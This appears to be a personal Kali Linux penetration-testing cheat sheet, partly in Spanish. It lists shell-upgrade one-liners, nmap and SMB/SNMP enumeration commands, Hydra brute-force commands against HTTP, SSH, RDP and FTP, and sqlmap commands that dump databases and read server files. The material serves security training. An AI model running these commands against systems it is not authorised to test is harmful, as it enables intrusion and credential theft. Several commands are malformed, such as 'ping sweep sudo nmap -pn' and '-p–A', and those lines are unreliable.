#Kali-Help-Sheet

# TTY Shells
## Python TTY Shell Trick:
`python -c 'import pty;pty.spawn("/bin/bash")'`

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Spawn Interactive sh shell:
`/bin/sh -i`

Spawn Perl TTY Shell:
`perl -e 'exec "/bin/sh";'`

Spawn Ruby TTY Shel:
`ruby -e 'exec "/bin/sh"'`

Spawn Lua TTY Shell:
`lua -e 'os.execute("/bin/sh")'`

Spawn TTY Shell from Vi:
`:!bash`

Spawn TTY Shell from NMAP:
`!sh`

# 🕵️ Recon and Enumeration

## 🌐 NMAP Commands

Nmap (“Network Mapper”) is a free and open-source utility for network discovery and security auditing. It's a versatile tool used by both systems and network administrators for tasks like network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.

### Commands

| Command | Description |
|---------|-------------|
| `nmap -v -sS -A -T4 target` | Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services. |
| `ping sweep sudo nmap -pn target` | Does a ping sweep over the target's network to see all the available IPs. |
| `nmap -v -sS -p–A -T4 target` | As above but scans all TCP ports (takes a lot longer). |
| `nmap -v -sU -sS -p- -A -T4 target` | As above but scans all TCP ports and UDP scan (takes even longer). |
| `nmap -v -p 445 –script=smb-check-vulns --script-args=unsafe=1 192.168.1.X` | Nmap script to scan for vulnerable SMB servers. |
| `nmap localhost` | Displays all the ports that are currently in use. |
| `ls /usr/share/nmap/scripts/* | grep ftp` | Search nmap scripts for keywords. |

# 👤 Username Enumeration

## SMB User Enumeration

| Command | Description |
|---------|-------------|
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.16X.XXX.XXX` | Enumerate users from SMB |
| `ridenum.py 192.16X.XXX.XXX 500 50000 dict.txt` | RID cycle SMB / enumerate users from SMB |
| `enum4linux -U 192.16X.XXX.XXX` | Enumerate SMB usernames using enum4linux |
## SNMP User Enumeration

| Command | Description |
|---------|-------------|
| `snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25` | Enumerate users from SNMP |
| `python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX` | Enumerate users from SNMP |
| `nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt` | Search for SNMP servers with nmap, grepable output |

# 🔒 Passwords

## Wordlists

| Command | Description |
|---------|-------------|
| `/usr/share/wordlists` | Kali word lists |
| `wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | Download a popular wordlist from GitHub |

# 🐍 Hydra

# Guía rápida de Hydra

| Comando | Descripción |
|---------|-------------|
| `hydra -h` | Menú de ayuda |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Fuerza bruta de autenticación básica - Lista de palabras combinada |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Fuerza bruta de autenticación básica - Listas de palabras de usuario/contraseña |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Fuerza bruta de formulario de inicio de sesión - Usuario que sabemos + lista contraseñas |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - Listas de palabras de usuario/contraseña |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Usuario que sabemos + lista contraseñas |


## Bruteforce de contraseña con usuario que sabemos

`hydra -l <username> -P /usr/share/wordlists/rockyou.txt http://<IP_Address>`

## Bruteforce de usuario y contraseña
`hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt http://<IP_Address>`

## Bruteforce de SSH

`hydra -L username.list -P password.list ssh://10.129.202.136 `

## Bruteforce de RDP

`hydra -L username.list -P password.list rdp://10.129.202.136`
 
# 👨‍💻​ Compiling Exploits

| Header Files                                         | OS      |
|------------------------------------------------------|---------|
| `process.h, string.h, winbase.h, windows.h, winsock2.h` | Windows |
| `arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/socket.h, sys/types.h, unistd.h` | Linux   |

# Cryptography 🔒 - Hash Lengths

| Hash   | Size      |
|--------|-----------|
| MD5    | 16 Bytes  |
| SHA-1  | 20 Bytes  |
| SHA-256| 32 Bytes  |
| SHA-512| 64 Bytes  |

# Hash Examples

| Hash            | Example                                                           |
|-----------------|-------------------------------------------------------------------|
| MD5             | 8743b52063cd84097a65d1633f5c74f5                                  |
| SHA1            | b89eaac7e61417341b710b727768294d0e6a277b                          |
| SHA-256         | 127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935  |
| SHA-512         | 82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f |

# SQLMap Examples 🐛

| Command                                                                                      | Description                                                                                      |
|----------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------|
| `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3` | Automated sqlmap scan                                                                           |
| `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"` | Targeted sqlmap scan                                                                        |
| `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`         | Scan URL for union + error-based injection with MySQL backend and use a random user agent + database dump |
| `sqlmap -o -u "http://meh.com/form/" --forms`                                                 | SQLMap check form for injection                                                                  |
| `sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump`                 | SQLMap dump and crack hashes for table users on database-name                                     |

╔════════╦═════════════════════════╗
║ Class  ║   IP Address Range       ║
╠════════╬═════════════════════════╣
║ Class A 1️⃣ ║ 0.0.0.0 – 127.255.255.255 ║
║ Class B 2️⃣ ║ 128.0.0.0 – 191.255.255.255 ║
║ Class C 3️⃣ ║ 192.0.0.0 – 223.255.255.255 ║
║ Class D 4️⃣ ║ 224.0.0.0 – 239.255.255.255 ║
║ Class E 5️⃣ ║ 240.0.0.0 – 255.255.255.255 ║
╚════════╩═════════════════════════╝

